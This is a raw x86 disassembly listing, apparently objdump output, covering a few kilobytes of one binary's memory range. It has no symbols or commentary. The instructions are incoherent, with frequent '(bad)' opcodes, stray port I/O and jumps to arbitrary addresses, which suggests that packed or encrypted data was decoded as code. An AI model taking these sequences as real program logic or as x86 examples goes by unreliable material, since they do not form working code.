  4150b5:	fiadd  WORD PTR [ebx+0x2a]
  4150b8:	adc    eax,0x5b1d6256
  4150bd:	mov    bl,0xf1
  4150bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4150c0:	xchg   ecx,eax
	...
  415131:	add    BYTE PTR [eax],al
  415133:	add    BYTE PTR [edx],al
  415135:	adc    al,BYTE PTR [ecx]
  415137:	mov    ds:0xb3a2b311,eax
  41513c:	adc    ah,BYTE PTR [esi+0x2f5ec4d9]
  415142:	mov    ah,0xc0
  415144:	jbe    0x41512d
  415146:	add    BYTE PTR [eax],al
  415148:	cmc    
  415149:	add    BYTE PTR [eax],al
  41514b:	add    bh,bl
  41514d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41514e:	jle    0x415158
  415150:	call   0xb362a236
  415155:	xchg   esp,esi
  415157:	mov    eax,ds:0xd9d27563
  41515c:	add    BYTE PTR [edi],cl
  41515e:	add    DWORD PTR es:[edx],ecx
  415161:	mov    edx,gs
  415163:	popa   
  415164:	sar    DWORD PTR [ecx+0x507aa3d7],1
  41516a:	mov    ah,0xf2
  41516c:	cwde   
  41516d:	out    0xdc,eax
  41516f:	pushf  
  415170:	jl     0x41519a
  415172:	add    dl,BYTE PTR [edi]
  415174:	adc    cl,BYTE PTR [edx]
  415176:	adc    BYTE PTR [edx+ecx*1],bl
  415179:	cwde   
  41517a:	aad    0x26
  41517c:	mov    esp,0xe8900dc1
  415181:	int3   
  415182:	push   0x79
  415184:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415185:	dec    ebx
  415186:	mov    bh,BYTE PTR [ebp-0x3]
  415189:	mov    bl,dh
  41518b:	xchg   edi,eax
  41518c:	pop    es
  41518d:	mov    bl,dl
  41518f:	or     BYTE PTR [ecx+edx*2-0x3c],bl
  415193:	pop    ds
  415194:	or     bl,BYTE PTR [esi+esi*8]
  415197:	pop    ss
  415198:	pusha  
  415199:	bound  ebx,QWORD PTR [ebx+0x5007eaf1]
  41519f:	jnp    0x415207
  4151a1:	sti    
  4151a2:	cmp    al,BYTE PTR [ebx]
  4151a4:	lea    esi,[esp+ebp*1]
  4151a7:	or     eax,0x94c7fa10
  4151ac:	add    al,0x5c
  4151ae:	mov    edx,0x78af8a4b
  4151b3:	add    BYTE PTR [ebx-0x70868fc2],ah
  4151b9:	fwait
  4151ba:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  4151bc:	aam    0xbc
  4151be:	sbb    edi,esi
  4151c0:	enter  0xa583,0x5a
  4151c4:	inc    ebp
  4151c5:	mov    bl,0x4a
  4151c7:	loope  0x4151f9
  4151c9:	pop    ecx
  4151ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4151cb:	jnp    0x415241
  4151cd:	clc    
  4151ce:	addr16 mov ch,0x33
  4151d1:	(bad)  
  4151d2:	jno    0x415191
  4151d4:	xor    al,0x34
  4151d6:	dec    edx
  4151d7:	mov    esp,0xde47215e
  4151dc:	dec    ebx
  4151dd:	or     dh,BYTE PTR [eax-0x2e]
  4151e0:	in     al,0x5e
  4151e2:	jp     0x4151e8
  4151e4:	ja     0x4151d4
  4151e6:	fsubp  st(4),st
  4151e8:	and    esi,DWORD PTR [ebx-0x57a8144a]
  4151ee:	lds    edx,FWORD PTR [ebp+0x3987a15a]
  4151f4:	sbb    eax,0x9d7a9882
  4151f9:	jno    0x41522e
  4151fb:	les    ebp,FWORD PTR [eax+eiz*1+0x5d]
  4151ff:	loop   0x415199
  415201:	push   esi
  415202:	btc    DWORD PTR [ebp+0x397a9d35],ebx
  415209:	lds    ebp,FWORD PTR [ebx+esi*1]
  41520c:	push   es
  41520d:	imul   ebp,DWORD PTR [ebx],0xffffff9b
  415210:	push   ds
  415211:	xchg   esp,eax
  415212:	icebp  
  415213:	dec    ebp
  415214:	jp     0x415239
  415216:	fs push ss
  415218:	xchg   DWORD PTR [eax],edx
  41521a:	clc    
  41521b:	(bad)  
  41521c:	cwde   
  41521d:	aam    0xc5
  41521f:	mov    edi,ebp
  415221:	fs popa 
  415223:	pusha  
  415224:	repz retf 
  415226:	or     edi,ecx
  415228:	or     ebx,edi
  41522a:	mov    DWORD PTR [ecx+0x6b],edx
  41522d:	xor    BYTE PTR [ebp-0x7750c299],dl
  415233:	loopne 0x4152aa
  415235:	mov    bh,0xed
  415237:	adc    BYTE PTR [esi+0x57],0x8a
  41523b:	and    BYTE PTR [edi-0x62a4db07],ch
	...
  4152b1:	add    BYTE PTR [eax],al
  4152b3:	add    BYTE PTR [ecx],al
  4152b5:	sub    DWORD PTR [ebp-0x23],0xddb1fded
  4152bc:	stos   BYTE PTR es:[edi],al
  4152bd:	dec    edx
  4152be:	out    0x6e,al
  4152c0:	scas   eax,DWORD PTR es:[edi]
  4152c1:	addr16 loopne 0x4152a6
  4152c4:	imul   ebp,eax,0x0
  4152c7:	add    ch,dh
  4152c9:	add    BYTE PTR [eax],al
  4152cb:	add    BYTE PTR [esi],bl
  4152cd:	es pop ss
  4152cf:	inc    eax
  4152d0:	dec    ebp
  4152d1:	xchg   esi,eax
  4152d2:	sub    ah,BYTE PTR [eax]
  4152d4:	(bad)  
  4152d5:	inc    ebx
  4152d6:	mov    edx,0x690aa734
  4152db:	syscall 
  4152dd:	inc    esi
  4152de:	mov    edx,db3
  4152e1:	popf   
  4152e2:	loopne 0x4152ac
  4152e4:	cld    
  4152e5:	fsubp  st(5),st
  4152e7:	and    bl,BYTE PTR [edi]
  4152e9:	sbb    eax,DWORD PTR ds:0x27783cd6
  4152ef:	and    BYTE PTR [esi+0x38],cl
  4152f2:	pop    ds
  4152f3:	stos   BYTE PTR es:[edi],al
  4152f4:	daa    
  4152f5:	aam    0xda
  4152f7:	in     eax,dx
  4152f8:	int3   
  4152f9:	dec    ebx
  4152fa:	mov    edx,0xed912d01
  4152ff:	add    BYTE PTR [edi+0x55],ch
  415302:	adc    dh,BYTE PTR [ebx-0x5ff195ff]
  415308:	and    al,0xea
  41530a:	mov    ?,WORD PTR [ecx+0x40afffda]
  415310:	in     al,0xd2
  415312:	jl     0x415317
  415314:	jp     0x41530e
  415316:	test   DWORD PTR [ebx+0x334351c8],ebx
  41531c:	add    esp,eax
  41531e:	cmp    al,bl
  415320:	jo     0x41538d
  415322:	or     edi,DWORD PTR [ebp-0x51fe128e]
  415328:	push   ecx
  415329:	mov    edi,DWORD PTR [ecx-0x66b91ad]
  41532f:	mov    eax,DWORD PTR [edx]
  415331:	fimul  WORD PTR [ecx-0x3b5c0016]
  415337:	push   ds
  415338:	xor    BYTE PTR [ebx-0x63],dl
  41533b:	pop    ds
  41533c:	jmp    0x4153b9
  41533e:	js     0x41538c
  415340:	sbb    esi,ebp
  415342:	retf   
  415343:	enter  0xfc45,0x5b
  415347:	outs   dx,DWORD PTR ds:[esi]
  415348:	or     DWORD PTR [eax-0x64],0xcd5af552
  41534f:	cmc    
  415350:	(bad)  
  415351:	jmp    0x4152d5
  415353:	xchg   ebx,eax
  415354:	daa    
  415355:	xor    al,0x1a
  415357:	xor    DWORD PTR [ecx],0x5383e84b
  41535d:	xor    al,0x46
  41535f:	push   ss
  415360:	mov    esp,0x1a961f41
  415365:	cs popa 
  415367:	lea    ebx,[edx-0xb4cf073]
  41536d:	gs (bad) 
  41536f:	jmp    0x95eb:0xcbe9e44a
  415376:	in     al,0xf
  415378:	mov    BYTE PTR [ebp+0xb1d92f9],al
  41537e:	and    eax,0xb2406564
  415383:	or     ch,bh
  415385:	stc    
  415386:	loope  0x41530b
  415388:	cmp    eax,0xcec2e7a0
  41538d:	(bad)  
  41538f:	pushf  
  415390:	daa    
  415391:	les    esi,FWORD PTR [esi+ecx*1]
  415394:	inc    ebp
  415395:	imul   eax,DWORD PTR ds:[eax+ebx*4],0xe8022c00
  41539d:	cmp    BYTE PTR [eax+0x69aa76cc],0xd3
  4153a4:	rcr    BYTE PTR [eax],0x7c
  4153a7:	jl     0x41535d
  4153a9:	mov    eax,0x4ee268e
  4153ae:	or     edx,DWORD PTR [ebx-0x31]
  4153b1:	sub    BYTE PTR [edi+0x37d130fb],ah
  4153b7:	xor    eax,0x97aca93f
  4153bc:	xlat   BYTE PTR ds:[ebx]
  4153bd:	mov    al,al
  4153bf:	(bad)  
  4153c0:	cmp    BYTE PTR [eax],al
	...
  415432:	add    BYTE PTR [eax],al
  415434:	pop    ebx
  415435:	jae    0x415479
  415437:	or     eax,0x775f3d6a
  41543c:	leave  
  41543d:	bnd jl 0x4153de
  415440:	ret    
  415441:	(bad)  
  415442:	in     al,0x8
  415444:	pusha  
  415445:	jmp    0x136544a
  41544a:	add    BYTE PTR [eax],al
  41544c:	and    ch,BYTE PTR [eax+ebp*1]
  41544f:	adc    bp,si
  415452:	scas   eax,DWORD PTR es:[edi]
  415453:	inc    ecx
  415454:	and    DWORD PTR [edi-0x28e86e55],edx
  41545a:	call   0x1d93:0x39ce341b
  415461:	sbb    eax,DWORD PTR [edx-0x14c4b9aa]
  415467:	rcl    BYTE PTR ds:0x3b3848f2,cl
  41546d:	call   0x4139:0xd9476c46
  415474:	mov    dh,0x25
  415476:	and    BYTE PTR [edi+0x202ee2a3],cl
  41547c:	rol    BYTE PTR [edi-0x33eaa215],1
  415482:	xchg   BYTE PTR [edx],dh
  415484:	mov    DWORD PTR [edi-0x6bb408bf],edx
  41548a:	adc    esp,DWORD PTR [ecx-0x65]
  41548d:	and    DWORD PTR [ecx-0x7df0c5fe],esi
  415493:	sahf   
  415494:	add    eax,0x3573f708
  415499:	and    dl,BYTE PTR [ebx]
  41549b:	das    
  41549c:	or     BYTE PTR [edx+0x5a],0xcf
  4154a0:	mov    edx,0x296a3ef6
  4154a5:	shl    ch,0xbf
  4154a8:	pushf  
  4154a9:	aad    0x37
  4154ab:	push   ds
  4154ac:	jge    0x415516
  4154ae:	adc    bh,BYTE PTR [eax]
  4154b0:	xlat   BYTE PTR ds:[ebx]
  4154b1:	lea    esi,[ebp+0x71]
  4154b4:	sbb    al,0xca
  4154b6:	bound  edx,QWORD PTR [ebx+0x3479033d]
  4154bc:	pop    ds
  4154bd:	jno    0x41551d
  4154bf:	xchg   ebx,eax
  4154c0:	gs retf 
  4154c2:	daa    
  4154c3:	xor    eax,0xd92d758d
  4154c8:	mov    eax,ds:0xdd5188c0
  4154cd:	xchg   edx,eax
  4154ce:	dec    eax
  4154cf:	sahf   
  4154d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154d1:	xor    esi,DWORD PTR [ebp-0x3928731e]
  4154d7:	fcomp  QWORD PTR [eax+0x5bf122e0]
  4154dd:	fs jnp 0x415460
  4154e0:	add    DWORD PTR ds:[edx-0x1d],ebp
  4154e4:	sub    DWORD PTR [ebp-0x72299961],esp
  4154ea:	mov    ecx,0xaf14c54c
  4154ef:	loop   0x4154e5
  4154f1:	js     0x4154ea
  4154f3:	jl     0x415523
  4154f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4154f6:	mov    bh,0x1b
  4154f8:	enter  0xe891,0xba
  4154fc:	imul   edi,DWORD PTR [ecx],0xffffffe5
  4154ff:	lods   al,BYTE PTR ds:[esi]
  415500:	pop    ecx
  415501:	and    cl,BYTE PTR [edi-0x56]
  415504:	fidivr WORD PTR [esi+0x7bc42f9e]
  41550a:	out    0x26,eax
  41550c:	and    al,BYTE PTR [edi+0x5f]
  41550f:	sbb    DWORD PTR [ecx],esp
  415511:	jle    0x41554a
  415513:	xlat   BYTE PTR ds:[ebx]
  415514:	add    cl,BYTE PTR [edx-0x6e]
  415517:	cmp    eax,0x69d35371
  41551c:	dec    ebx
  41551d:	arpl   WORD PTR [eax],dx
  41551f:	mov    bh,0xd2
  415521:	or     al,0xa3
  415523:	test   eax,0xc2919058
  415528:	xor    al,0x39
  41552a:	jge    0x415571
  41552c:	jl     0x415579
  41552e:	(bad)  
  41552f:	fmul   st,st(0)
  415531:	mov    ds:0xcb217af5,eax
  415536:	jne    0x41552d
  415538:	outs   dx,BYTE PTR ds:[esi]
  415539:	mov    dh,0x64
  41553b:	lds    edi,FWORD PTR [esi-0x74c39b47]
	...
  4155b1:	add    BYTE PTR [eax],al
  4155b3:	add    BYTE PTR [edi+0x5e],bh
  4155b6:	cmc    
  4155b7:	ins    DWORD PTR es:[edi],dx
  4155b8:	cmc    
  4155b9:	out    dx,eax
  4155ba:	call   FWORD PTR [esi-0x5a]
  4155bd:	sub    BYTE PTR [esi+0x31],al
  4155c0:	ds adc al,0x47
  4155c3:	add    BYTE PTR [ebp-0x16],dl
  4155c6:	add    BYTE PTR [eax],al
  4155c8:	cmc    
  4155c9:	add    BYTE PTR [eax],al
  4155cb:	add    cl,al
  4155cd:	inc    ebx
  4155ce:	ret    
  4155cf:	leave  
  4155d0:	outs   dx,BYTE PTR ds:[esi]
  4155d1:	push   esp
  4155d2:	and    al,0x7f
  4155d4:	jnp    0x415614
  4155d6:	test   DWORD PTR [edi-0x1c],eax
  4155d9:	leave  
  4155da:	and    edi,0xfc1e4dca
  4155e0:	adc    dh,dl
  4155e2:	test   bl,0x67
  4155e5:	cmp    BYTE PTR [esi+0x61eecf4d],cl
  4155eb:	sbb    BYTE PTR [eax],cl
  4155ed:	cli    
  4155ee:	inc    edx
  4155ef:	clc    
  4155f0:	jg     0x4155eb
  4155f2:	dec    ebx
  4155f3:	xchg   edi,eax
  4155f4:	scas   eax,DWORD PTR es:[edi]
  4155f5:	js     0x415623
  4155f7:	cmp    dl,BYTE PTR [ecx]
  4155f9:	mov    ah,0x5b
  4155fb:	js     0x415582
  4155fd:	push   ebx
  4155fe:	mov    al,0xf2
  415600:	and    al,0xf2
  415602:	and    cl,0x45
  415605:	xacquire xchg BYTE PTR [edx+0x502f2e1f],ah
  41560c:	test   BYTE PTR [edx+ebx*4-0x67eaa63e],al
  415613:	cmp    ah,BYTE PTR [edx]
  415615:	push   edi
  415616:	sub    edx,DWORD PTR [ebx-0x19]
  415619:	mov    cl,0x4f
  41561c:	sub    ah,bl
  41561e:	pop    ebp
  41561f:	or     eax,0x1eb640af
  415624:	sti    
  415625:	push   ds
  415626:	loopne 0x415696
  415628:	leave  
  415629:	call   0x746e3556
  41562e:	lds    ebx,FWORD PTR [ebx]
  415630:	aas    
  415631:	adc    ch,BYTE PTR [edi-0x7b]
  415634:	push   ecx
  415635:	rol    DWORD PTR [esi+0x3bdc8952],0x8c
  41563c:	test   BYTE PTR [ecx-0x5f0f5d7d],bl
  415642:	je     0x4156ac
  415644:	and    eax,0xbf80e569
  415649:	inc    edi
  41564a:	ret    
  41564b:	xor    esi,DWORD PTR [ebp-0x5f8ad883]
  415651:	inc    ebx
  415652:	inc    edi
  415653:	fiadd  WORD PTR ds:0xaad59384
  415659:	adc    eax,DWORD PTR [edi]
  41565b:	popa   
  41565c:	inc    esp
  41565d:	enter  0xd559,0x2
  415661:	fdiv   st,st(2)
  415663:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415664:	lahf   
  415665:	mov    edx,DWORD PTR [edx+0x37]
  415668:	mov    DWORD PTR [ecx+0x58],ecx
  41566b:	jbe    0x415666
  41566d:	pop    es
  41566e:	cmc    
  41566f:	push   cs
  415670:	loop   0x41564a
  415672:	sbb    DWORD PTR [edi],ebx
  415674:	retf   
  415675:	and    al,0xa6
  415677:	jg     0x41568c
  415679:	adc    eax,0x67df16a9
  41567e:	scas   al,BYTE PTR es:[edi]
  41567f:	push   es
  415680:	test   eax,0xc8b6fa52
  415685:	sbb    ebp,0x31
  415688:	out    dx,eax
  415689:	imul   ecx,DWORD PTR [eax+0x2b62d6e7],0x6ea7f4f
  415693:	ret    0x46c6
  415696:	retf   0xa2ef
  415699:	test   eax,0xa218da9c
  41569e:	icebp  
  41569f:	push   eax
  4156a0:	mov    ebp,0x6c9c9a14
  4156a5:	(bad)  
  4156a6:	lock aam 0x2e
  4156a9:	(bad)  
  4156aa:	xchg   ebp,eax
  4156ab:	xchg   ebp,eax
  4156ac:	ret    0xa399
  4156af:	mov    esi,0xbfecb228
  4156b4:	mov    eax,0x2fae8b18
  4156b9:	mov    BYTE PTR [ebp+0x37],dh
  4156bc:	das    
  4156bd:	pop    edi
  4156be:	jl     0x41569a
  4156c0:	push   ebx
	...
  415731:	add    BYTE PTR [eax],al
  415733:	add    BYTE PTR [esi+0x2f],bh
  415736:	add    DWORD PTR [ebp+0x51],ebp
  415739:	outs   dx,DWORD PTR ds:[esi]
  41573a:	jle    0x41577b
  41573c:	dec    esp
  41573d:	xchg   esp,eax
  41573e:	call   0xdcde13d3
  415743:	aam    0x4a
  415745:	jmp    0x415747
  415747:	add    ch,dh
  415749:	add    BYTE PTR [eax],al
  41574b:	add    BYTE PTR [esi+0xd],cl
  41574e:	icebp  
  41574f:	cli    
  415750:	dec    esi
  415751:	cmp    DWORD PTR [eax+0x5346bef0],0x80163360
  41575b:	dec    esi
  41575c:	mov    BYTE PTR [esp+eiz*4],ch
  41575f:	cld    
  415760:	addr16 stc 
  415762:	imul   ebp,esp,0x1cf4e651
  415768:	cmp    ecx,DWORD PTR [esi-0x7c6e51db]
  41576e:	adc    bh,BYTE PTR [ecx-0x2cfe907f]
  415774:	xchg   BYTE PTR fs:[ebx],bh
  415777:	mov    edi,ebp
  415779:	nop
  41577a:	ds xchg edi,eax
  41577c:	idiv   BYTE PTR [esi]
  41577e:	pop    ebp
  41577f:	sbb    bl,BYTE PTR [ebp-0x207e50be]
  415785:	mov    bl,0x75
  415787:	dec    ebp
  415788:	div    BYTE PTR [ebx+0x350f1e20]
  41578e:	push   ds
  41578f:	add    al,0xd0
  415791:	push   edx
  415792:	jecxz  0x41574b
  415794:	ds retf 0xc3e
  415798:	sbb    edx,ebx
  41579a:	loope  0x415799
  41579c:	xlat   BYTE PTR ds:[ebx]
  41579d:	mov    esp,0xef3a4154
  4157a2:	jo     0x4157b2
  4157a4:	xchg   DWORD PTR [edi+0x47ad9490],esi
  4157aa:	fld    QWORD PTR [eax-0x4d]
  4157ad:	jne    0x4157f0
  4157af:	xor    eax,0x513ef3b1
  4157b4:	push   0xbf6dc84e
  4157b9:	pop    ecx
  4157ba:	test   eax,0x709d8e49
  4157bf:	fld    st(7)
  4157c1:	mov    cs,WORD PTR [ebx-0xe868b3e]
  4157c7:	push   esi
  4157c8:	lods   eax,DWORD PTR ds:[esi]
  4157c9:	aad    0xd4
  4157cb:	mov    ds:0xdc03892c,eax
  4157d0:	jnp    0x415757
  4157d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4157d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4157d4:	jne    0x415773
  4157d6:	cmovs  esi,DWORD PTR [ecx+ecx*4]
  4157da:	outs   dx,BYTE PTR ds:[esi]
  4157db:	jae    0x41582c
  4157dd:	sbb    eax,0xaaeaeb36
  4157e2:	cwde   
  4157e3:	test   al,0xf1
  4157e5:	out    dx,al
  4157e6:	test   BYTE PTR [esi-0x66d7633b],bh
  4157ec:	mov    al,ds:0xd2f2f115
  4157f1:	retf   
  4157f2:	pop    DWORD PTR [ecx-0xc]
  4157f5:	sub    al,0x3c
  4157f7:	stos   DWORD PTR es:[edi],eax
  4157f8:	push   edx
  4157f9:	or     eax,esi
  4157fb:	enter  0x6491,0x18
  4157ff:	daa    
  415800:	jmp    0x531a:0xc364263d
  415807:	stos   BYTE PTR es:[edi],al
  415808:	icebp  
  415809:	(bad)  
  41580a:	repnz pusha 
  41580c:	loop   0x41588a
  41580e:	scas   al,BYTE PTR es:[edi]
  41580f:	cli    
  415810:	std    
  415811:	repz ficom DWORD PTR [edx-0x32e215a6]
  415818:	mov    ds:0xe63f3aba,al
  41581d:	scas   al,BYTE PTR es:[edi]
  41581e:	ficomp WORD PTR ds:0x8202d209
  415824:	push   ecx
  415825:	test   DWORD PTR [edi],ebp
  415827:	enter  0xe8dd,0x8f
  41582b:	jbe    0x4157d6
  41582d:	(bad)  
  41582e:	fcomp  QWORD PTR ds:0xf3573bc2
  415834:	test   BYTE PTR [ecx+ebx*1+0x5a],ch
  415838:	adc    DWORD PTR [edi],ebp
  41583a:	fmul   DWORD PTR [eax-0x79]
  41583d:	retf   
  41583e:	push   ds
  41583f:	fwait
  415840:	jnp    0x415842
	...
  4158b2:	add    BYTE PTR [eax],al
  4158b4:	or     edi,DWORD PTR [esi-0x2e]
  4158b7:	and    esi,edi
  4158b9:	scas   eax,DWORD PTR es:[edi]
  4158ba:	sti    
  4158bb:	jle    0x41583e
  4158bd:	inc    eax
  4158be:	sbb    eax,0x52415cfe
  4158c3:	push   ecx
  4158c4:	aas    
  4158c5:	in     al,dx
  4158c6:	add    BYTE PTR [eax],al
  4158c8:	cmc    
  4158c9:	add    BYTE PTR [eax],al
  4158cb:	add    BYTE PTR [edi-0x39],bl
  4158ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4158cf:	imul   eax,DWORD PTR [eax+esi*1+0x5f],0xdd9c3c27
  4158d7:	jnp    0x4158e4
  4158d9:	dec    ecx
  4158da:	cs cdq 
  4158dc:	mov    bh,BYTE PTR [ecx]
  4158de:	mov    ecx,0xc363554d
  4158e3:	mov    ah,0x73
  4158e5:	xor    BYTE PTR [ecx+0x66],bh
  4158e8:	inc    ebp
  4158e9:	adc    DWORD PTR [edi-0x96b937d],ebx
  4158ef:	jns    0x4158da
  4158f1:	dec    edi
  4158f2:	mov    ebx,ebx
  4158f4:	add    al,0xcc
  4158f6:	cmp    BYTE PTR [esi+0x32],bh
  4158f9:	jno    0x4158bb
  4158fb:	adc    esi,esp
  4158fd:	cli    
  4158fe:	aam    0x60
  415900:	mov    eax,0x9ac55185
  415905:	mov    edx,esp
  415907:	scas   al,BYTE PTR es:[edi]
  415908:	mov    cl,0x6f
  41590a:	shr    DWORD PTR [eax+0x73],cl
  41590d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41590e:	js     0x415890
  415910:	cmc    
  415911:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415912:	add    ch,BYTE PTR [edi]
  415914:	mul    DWORD PTR [eax]
  415916:	pop    esp
  415917:	cmc    
  415918:	push   ebp
  415919:	sbb    dl,dh
  41591b:	sub    esi,DWORD PTR [esi+0xe5b4593]
  415921:	push   ebp
  415922:	xchg   edx,eax
  415923:	mov    dl,0xcb
  415925:	sub    DWORD PTR [ebp+0x52],ebx
  415928:	adc    eax,0x2cb19f91
  41592d:	jb     0x415913
  41592f:	test   eax,0x8ead574e
  415934:	iret   
  415935:	sahf   
  415936:	lds    esp,FWORD PTR [ebp+edi*1-0x22]
  41593a:	ss jnp 0x41593d
  41593d:	(bad)  
  41593f:	jecxz  0x41598b
  415941:	push   eax
  415942:	sbb    al,0x57
  415944:	adc    eax,0x4b794e8
  415949:	mov    dl,0x75
  41594b:	sbb    DWORD PTR [ecx-0x13],0x3
  41594f:	pop    ebx
  415950:	mov    bh,0x8b
  415952:	out    0x3f,al
  415954:	xor    edi,edi
  415956:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415957:	cmp    DWORD PTR [ebx],ebx
  415959:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41595a:	addr16 in al,dx
  41595c:	cwde   
  41595d:	adc    BYTE PTR [ecx-0x1e],ah
  415960:	js     0x415985
  415962:	test   eax,0x6370e9ef
  415967:	mov    ds:0xe4ca9d8b,eax
  41596c:	out    dx,eax
  41596d:	ror    dl,cl
  41596f:	sbb    bh,BYTE PTR [esi]
  415971:	push   cs
  415972:	iret   
  415973:	shr    DWORD PTR [ecx-0x1],cl
  415976:	pop    esp
  415977:	xchg   esi,eax
  415978:	or     eax,0xd20a2a15
  41597d:	pushf  
  41597e:	sub    ah,0x5
  415981:	rol    BYTE PTR [eax-0x8],0x35
  415985:	and    BYTE PTR [esi+0x2225926d],cl
  41598b:	pop    ds
  41598c:	(bad)  
  41598d:	sbb    ebp,DWORD PTR ds:0x7feaa449
  415993:	add    DWORD PTR [edi],0x1a
  415996:	mov    edx,0x66b5ba69
  41599b:	aad    0x35
  41599d:	jnp    0x4159f2
  41599f:	sub    DWORD PTR [edx-0x3b9e2750],esi
  4159a5:	ss add ah,ah
  4159a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4159a9:	in     al,0x52
  4159ab:	lea    ecx,[ebp+0x25]
  4159ae:	imul   esi,DWORD PTR [edi+esi*4+0x52cd113b],0x97c5d59
  4159b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4159ba:	in     al,0xce
  4159bc:	xchg   edi,eax
  4159bd:	(bad)  
  4159be:	sahf   
  4159bf:	pop    ebp
  4159c0:	in     al,dx
	...
  415a31:	add    BYTE PTR [eax],al
  415a33:	add    BYTE PTR [edi+0x7e363ed9],bl
  415a39:	neg    DWORD PTR [edi+0x4f7241f9]
  415a3f:	lahf   
  415a40:	aad    0x16
  415a42:	sar    dh,1
  415a44:	xor    al,0xed
  415a46:	add    BYTE PTR [eax],al
  415a48:	cmc    
  415a49:	add    BYTE PTR [eax],al
  415a4b:	add    BYTE PTR [ebp-0x1595b632],ch
  415a51:	inc    esi
  415a52:	xchg   edi,esp
  415a54:	dec    eax
  415a55:	inc    ebp
  415a56:	inc    esp
  415a57:	ror    DWORD PTR [edx-0x2125814b],cl
  415a5d:	(bad)  
  415a5e:	adc    al,0xde
  415a60:	pushf  
  415a61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a62:	mov    WORD PTR [eax-0x3b104f21],ss
  415a68:	popf   
  415a69:	jge    0x415ac6
  415a6b:	retf   
  415a6c:	adc    eax,0xdf3ff7fd
  415a71:	cmc    
  415a72:	add    BYTE PTR [ecx-0x2d81b9b5],0x50
  415a79:	and    DWORD PTR [edi+edx*1-0x26],ebp
  415a7d:	inc    esp
  415a7e:	repz xchg edx,eax
  415a80:	mov    edi,ds
  415a82:	fidivr DWORD PTR [edi+edi*2-0x1]
  415a86:	shl    BYTE PTR [ecx+0x36b262],cl
  415a8c:	pop    esp
  415a8d:	adc    eax,0x4258d1a7
  415a92:	cmp    eax,0xe8c31ba7
  415a97:	dec    ebp
  415a98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a99:	push   0xffffffbe
  415a9b:	fisubr WORD PTR [edi+0x5ddf5eea]
  415aa1:	xchg   esi,eax
  415aa2:	js     0x415aa9
  415aa4:	mov    ds:0x50487b61,al
  415aa9:	inc    esi
  415aaa:	push   ss
  415aab:	cmc    
  415aac:	mov    esp,0x3f1509b4
  415ab1:	xor    al,0xdf
  415ab3:	pop    edx
  415ab4:	xor    DWORD PTR [edx+0x41],ebx
  415ab7:	mov    edx,0x59cfe0d2
  415abc:	das    
  415abd:	addr16 test al,0xbf
  415ac0:	loope  0x415a54
  415ac2:	test   BYTE PTR [esi+edi*1+0x12],0xab
  415ac7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ac8:	sti    
  415ac9:	cmc    
  415aca:	cld    
  415acb:	int    0x2f
  415acd:	(bad)  
  415ace:	ds inc ebp
  415ad0:	popa   
  415ad1:	sbb    DWORD PTR [edi+0x7f8e0a66],0x130d1dc7
  415adb:	outs   dx,DWORD PTR ds:[esi]
  415adc:	jno    0x415a76
  415ade:	int3   
  415adf:	jg     0x415b27
  415ae1:	push   esi
  415ae2:	lock adc BYTE PTR [edx-0x63],dh
  415ae6:	outs   dx,DWORD PTR ds:[esi]
  415ae7:	(bad)  
  415ae8:	cld    
  415ae9:	mov    eax,DWORD PTR [ecx-0x52]
  415aec:	int    0xef
  415aee:	in     al,dx
  415aef:	push   esi
  415af0:	mov    cl,al
  415af2:	lea    ecx,[esi]
  415af4:	or     DWORD PTR [edi+0x13b700d5],ecx
  415afa:	cmp    al,BYTE PTR [esi-0x30ceac6b]
  415b00:	icebp  
  415b01:	xor    al,0x9c
  415b03:	out    0x27,al
  415b05:	clc    
  415b06:	inc    esi
  415b07:	mov    esi,0x2d0ba987
  415b0c:	mov    gs,WORD PTR [ebx+0x1d]
  415b0f:	mov    bh,0xe9
  415b11:	sbb    esp,edx
  415b13:	push   eax
  415b14:	push   cs
  415b15:	add    ecx,DWORD PTR [di+0x25]
  415b19:	inc    ebx
  415b1b:	outs   dx,DWORD PTR ds:[esi]
  415b1c:	jne    0x415ac4
  415b1e:	and    eax,0xaceb02a6
  415b23:	mov    ebx,0x31a535d3
  415b28:	sti    
  415b29:	(bad)  
  415b2a:	icebp  
  415b2b:	mov    ah,0x46
  415b2d:	(bad)  
  415b2e:	mov    eax,0xeae3ed7f
  415b33:	mul    BYTE PTR [edi-0x47785f86]
  415b39:	in     al,dx
  415b3a:	mov    ah,0xdd
  415b3c:	push   es
  415b3d:	dec    edi
  415b3e:	sbb    al,0x62
  415b40:	mov    esp,0x0
	...
  415bb1:	add    BYTE PTR [eax],al
  415bb3:	add    BYTE PTR [esp+eiz*2],dh
  415bb6:	push   ds
  415bb7:	jl     0x415c17
  415bb9:	jle    0x415c31
  415bbb:	ins    BYTE PTR es:[edi],dx
  415bbc:	pop    ds
  415bbd:	dec    DWORD PTR [edi+0x5a]
  415bc0:	daa    
  415bc1:	sbb    edi,edx
  415bc3:	imul   BYTE PTR [ecx]
  415bc5:	out    dx,al
  415bc6:	add    BYTE PTR [eax],al
  415bc8:	cmc    
  415bc9:	add    BYTE PTR [eax],al
  415bcb:	add    BYTE PTR [ecx-0xe],ch
  415bce:	in     al,0x19
  415bd0:	retf   0x4950
  415bd3:	out    dx,eax
  415bd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415bd5:	pop    eax
  415bd6:	push   ss
  415bd7:	pop    edx
  415bd8:	pop    ds
